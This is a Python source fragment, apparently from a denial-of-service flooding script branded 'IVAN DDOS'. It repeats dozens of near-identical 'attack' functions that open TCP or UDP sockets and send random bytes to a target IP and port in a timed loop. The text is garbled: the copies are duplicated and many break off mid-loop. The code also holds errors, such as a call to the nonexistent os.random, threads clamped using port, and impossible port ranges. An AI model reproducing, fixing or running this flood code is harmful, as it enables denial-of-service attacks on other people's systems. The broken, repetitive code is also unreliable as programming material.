    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
